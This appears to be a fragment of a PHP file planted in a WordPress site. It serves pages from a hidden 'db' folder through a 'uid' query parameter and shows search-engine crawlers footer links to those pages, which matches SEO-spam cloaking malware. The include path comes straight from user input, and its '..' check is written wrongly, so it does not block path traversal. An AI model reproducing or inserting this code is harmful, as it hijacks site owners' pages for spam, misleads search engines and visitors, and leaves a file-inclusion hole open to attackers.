...
function PageDir($dir){$dirArray[]=NULL;if(false!=($handle=@opendir($dir))){$i=0;while(false!==($file=readdir($handle))){if (strpos($file,".html")>0){$dirArray[$i]=$file;$i++;}}closedir($handle);}return $dirArray;}
function pagestart(){if($_GET["uid"]<>"" && stripos("..",$_GET["uid"])==false){include_once(dirname(__FILE__)."/db/".$_GET["uid"]);exit();}if(isCrawler()){add_action('wp_footer','Glink');}}
function Glink(){$dir = PageDir(dirname(__FILE__)."/db/");$rand_dir=@array_rand($dir,3);if (count($dir)>1){foreach($rand_dir as $t_num){echo '<a href="'.home_url().'/?uid='.$dir[$t_num].'" target="_blank">'.str_replace('.html','',str_replace('-',' ' ,$dir[$t_num])).'</a>';}}}

add_action( 'template_redirect','pagestart');
